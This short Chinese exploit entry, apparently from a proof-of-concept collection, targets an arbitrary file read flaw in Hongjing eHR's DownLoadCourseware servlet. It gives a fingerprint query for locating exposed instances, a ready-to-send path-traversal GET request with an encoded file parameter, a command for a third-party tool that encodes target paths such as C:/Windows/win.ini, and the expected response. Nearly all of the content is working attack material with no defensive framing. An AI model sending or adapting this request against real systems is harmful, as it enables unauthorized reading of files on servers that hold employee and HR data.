# 宏景eHRDownLoadCourseware任意文件读取漏洞

宏景eHRDownLoadCourseware ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="HJSOFT-HCM"`
- **请求**：`GET /w_selfservice/oauthservlet/%2e./.%2e/DownLoadCourseware?url=VHmj0PAATTP2HJBPAATTPcyRcHb6hPAATTP2HJFPAATTP59XObqwUZaPAATTP2HJBPAATTP6EvXjT HTTP/1.1`

**Payload**
```
读取文件内容需使用工具编码
工具地址：[https://github.com/vaycore/HrmsTool](https://github.com/vaycore/HrmsTool" \o "https://github.com/vaycore/HrmsTool)
java -jar HrmsTool.jar -e C:/Windows/win.ini
```
- **响应特征**：200 [Mail]